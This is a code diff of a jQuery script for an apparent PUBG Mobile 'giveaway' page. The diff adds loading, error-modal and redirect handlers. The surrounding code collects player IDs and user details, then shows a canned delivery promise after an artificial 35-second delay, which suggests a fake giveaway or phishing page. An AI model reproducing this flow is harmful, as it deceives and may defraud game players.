@@ -151,11 +151,20 @@ $(document).ready(function () {
         }
     });
 
+    $(document).ajaxStart(function () {
+        $("#snackbar").addClass('show');
+        $("#data :input"). prop("disabled", true);
+        $('#tapatap').addClass('disabled');
+    }).ajaxStop(function () {
+        $("#snackbar").removeClass('show');
+    });
+
     $('.fa-sync').on('click', function () {
         captchaGen();
     });
 
     $('#tapatap').on('click', function (e) {
+
         let igid = $('#igid').val(),
             ign = $('#ign').val(),
             user = $('#user').val(),
@@ -209,15 +218,25 @@ $(document).ready(function () {
                                     "It will take several hours to deliver <r>" + `${materials}` + "</r> materials to your pubg mobile account (<r>" + `${igid}` +
                                     "</r>). You'll receive the materials in-game mail system.<br><br> Thank you for participating in the giveaway !"
                                 );
+                                $('.modal-footer').show();
                             }, 35000);
                         } else {
                             console.log(`status: ${xhr.status}`);
                             console.log(`text status: ${textStatus}`);
-                            console.log(`data: ${data}`);
+                            console.log(data);
                         }
+                    },
+                    error: function (textStatus, errorThrown) {
+                        $('#err-modal').modal('show');
+                        console.log(`status: ${textStatus}`);
+                        console.log(errorThrown);
                     }
                 });
             }
         }
+    });
+
+    $('#dismiss').on('click', function () {
+        window.location.href = "index.html";
     });
 });
